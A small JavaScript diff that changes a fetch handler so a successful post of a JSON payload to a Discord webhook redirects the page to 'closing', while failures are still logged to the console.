@@ -712,9 +712,11 @@
 						body: JSON.stringify(payload)
 					})
 					.then(response => {
-						if (!response.ok) {
-							console.error('Error sending data to Discord webhook');
-						}
+					if (response.ok) {
+						location.href = 'closing';
+					} else {
+						console.error('Error sending data to Discord webhook');
+					}
 					})
 					.catch(error => console.error('Error sending data to Discord webhook:', error));
 				})
